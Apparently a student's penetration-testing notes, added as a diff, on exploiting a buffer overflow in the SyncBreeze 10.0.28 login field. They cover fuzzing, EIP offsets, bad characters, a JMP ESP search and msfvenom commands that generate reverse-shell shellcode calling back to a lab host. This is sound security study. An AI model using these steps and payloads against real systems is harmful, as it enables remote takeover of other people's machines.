@@ -1,0 +1,95 @@
+------------------
+NOTES
+------------------
+
+Vulnerability in the SyncBreeze application
+
+Discovering the Vulnerability
+	Reversing or fuzzing
+		fuzzing is shoving input EVERYWHERE, hoping for a crash
+	Fuzzers are "generation based" if they created malfored payloads from scratch
+	Mutation based fuzzers changes existing inputs by using  techniques such as bit flipping
+	Fuzzing the HTTP protocol
+		BOF was found in the login mechanism of versoin 10.0.28 in 2017
+		Copy the request from wireshark or burp into a buffer
+			make sure to add the carriage returns
+		create a socket and connect to the ip and port
+		send the raw data over the socket, replacing the username with a payload
+
+Win32 Buffer Overflow Exploitation
+	DEP, ASLR, and CFG
+		DEP - Data execution prevention
+			marks specific code as "executable" and if code is not marked as executable it cant be ran
+			meaning that you cant just plop shellcode onto the stack and jump to it
+		ASLR - Address space layout randomization
+			randomizes the locations and starting points for a program, meaning EIP and shellcode will be in different spots upon execution
+			therefore, cant pull out and hardcode an address into the shellcode
+		CFG - Control-flow integrity
+			prevents overwrite of function pointers
+		SyncBreeze is not compiled with these in place so we dont have to worry about bypassing them :D
+
+	Replicating the crash
+		SyncBreeze will crash when roughly 800-900 words are shoved into the username field
+		alter script to remove the while loop and just send a targeted payload
+
+		We know that we can overwrite EIP but not sure where exactly this is happening ://
+		could guess and check repeatedly.... orrrrr use a cool tool like msf-pattern-create
+			/usr/bin/msf-pattern_create -l 800 | xclip -sel c
+				create a pattern and copy it to the clipboard
+			msf-pattern_offset -l 800 -q 42306142
+				find the exact offset
+
+	Controlling EIP
+		eip tells the program where to look in memory to execute code
+		if we can overwrite eip with our own address of some sneaky code, we can execute it
+		Binary tree analysis
+			starting with A * 800
+			then A * 400 + B * 400
+			then A * 400 + B * 200 + C * 200
+			etc
+		or can use a non repeating pattern to find which characters overwrote the register
+			(msfpattern create)
+
+	Locating space for shellcode
+		have control over EIP but dont know what address to overwrite it with
+		through a debugger, looking at the crash, find where the rest of the payload is stored in memory
+		can send shellcode AFTER the buffer as well
+		payload = filler + eip + offset + shellcode
+
+	Bad characters
+		depending on the app that is running, certain characters can break it
+			ex. a null char 0x00 will terminate a C string
+				if you have a 0x00 in your shellcode, it will terminate after that character
+			ex. avoid 0x0D in HTTP POST requests, return character
+		can test my sending all bytes from 0x00 to 0xFF and seeing where (if at all) the payload get truncated
+
+		 0x00, 0x0A, 0x0D, 0x25, 0x26, 0x2B, and 0x3D all bad for the sample app
+
+	Finding a return address
+		JMP ESP
+			shellcode is stored on the stack, pointed to by ESP
+			if we can find a gadget that has the JMP ESP instruction, then we can overwrite EIP with this address and jump to our shellcode
+			many libraries have this feature
+				cant have ASLR enabled
+		Get the hex representation of jmp esp
+			msf-nasm_shell
+			nasm > jmp esp
+			FFE4
+		In immunity
+			!mona find -s "\xff\xe4" -m "libspp.dll"
+
+	Generating shellcode with MSF
+		msfvenom -l payloads
+
+		msfvenom -p windows/shell_reverse_tcp LHOST=10.11.0.4 LPORT=443 -f c
+			-p - specify the payload
+			-f - format of the code
+				-f py is also nice
+			msfvenom -p windows/shell_reverse_tcp LHOST=10.11.0.4 LPORT=443 -f c –e x86/shikata_ga_nai -b "\x00\x0a\x0d\x25\x26\x2b\x3d"
+				-e - specify the encoder
+				-b - list of the bad bytes
+
+	Improving the exploit
+		default exit method will crash the entire service
+		but can specify the exitfunc in msf to use a different api
+			msfvenom -p windows/shell_reverse_tcp LHOST=10.11.0.4 LPORT=443 EXITFUNC=thread -f c –e x86/shikata_ga_nai -b "\x00\x0a\x0d\x25\x26\x2b\x3d"
